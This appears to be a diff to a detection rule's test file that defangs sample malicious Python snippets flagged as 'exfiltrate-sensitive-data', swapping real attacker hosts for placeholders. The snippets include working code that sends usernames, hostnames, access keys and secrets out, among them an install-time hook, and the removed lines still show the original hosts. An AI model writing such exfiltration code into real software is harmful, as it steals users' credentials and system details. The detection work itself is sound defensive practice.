@@ -68,12 +68,12 @@ for i in xrange(0, len(info)):
     else:
         posty += "%%%02X" % ord(info[i])
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("packageman.comlu.com", 80))
+s.connect(("packageman.DEFANGED.com", 80))
 # ruleid: exfiltrate-sensitive-data
 s.send(
     "POST / HTTP/1.1\r\n"
     + "User-Agent: Python\r\n"
-    + "Host: packageman.comlu.com\r\n"
+    + "Host: DEFANGED.DEFANGED.com\r\n"
     + "Content-Type: application/x-www-form-urlencoded\r\n"
     + "Content-Length: "
     + str(len(posty))
@@ -104,7 +104,7 @@ def detect():
     headers = {"Content-Type": "application/json"}
     # ruleid: exfiltrate-sensitive-data
     request(
-        url="http://us.dslab.pw/webhook.php",
+        url="http://example.com/DEFANGED.php",
         method="POST",
         data=json.dumps(data).encode("utf-8", errors="ignore"),
         headers=headers,
@@ -139,19 +139,19 @@ def checkVersion():
 
         # ruleid: exfiltrate-sensitive-data
         request.urlopen(
-            r"http://numipy.openvc.org/spark.php",
+            r"http://example.com/DEFANGED.php",
             data="vid=".encode("utf-8") + base64.b64encode(vid.encode("utf-8")),
         )
     elif sys.version_info < (3, 0):
         # ruleid: exfiltrate-sensitive-data
-        urllib.urlopen(r"http://numipy.openvc.org/spark.php", "vid=" + base64.encodestring(vid))
+        urllib.urlopen(r"http://example.com/DEFANGED.php", "vid=" + base64.encodestring(vid))
 
 
 """ RULEID: mybiubiubiu
 """
 username = getpass.getuser()
 hostname = platform.node()
-ip = request("https://enabledns.com/ip", method="GET")
+ip = request("https://example.com.com/ip", method="GET")
 data = {
     "username": str(username),
     "hostname": str(hostname),
@@ -164,7 +164,7 @@ data = {
 
 # ruleid: exfiltrate-sensitive-data
 req = urlrequest.Request(
-    url="http://123.206.22.33:5000/p/",
+    url="http://1.1.1.1:5000/p/",
     method="POST",
     data=json.dumps(data).encode("utf-8", errors="ignore"),
     headers={"Content-Type": "application/json"},
@@ -207,7 +207,7 @@ class Ctx(dict):
     def sendRequest(self):
         # todoruleid: exfiltrate-sensitive-data
         response = requests.get(
-            "https://anti-theft-web[.]herokuapp.com/hacked/" + self.name + "/" + self.access + "/" + self.secret
+            "https://example.com/hacked/" + self.name + "/" + self.access + "/" + self.secret
         )
 
 
@@ -232,7 +232,7 @@ class CustomInstall(install):
         username = getpass.getuser()
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
         # ruleid: exfiltrate-sensitive-data
-        requests.get("https://eo6ksiuyau5e5x2.m.pipedream.net",params = ploads)
+        requests.get("https://example.com",params = ploads)
 
 
 """ RULEID: sqlite3 data exfiltration
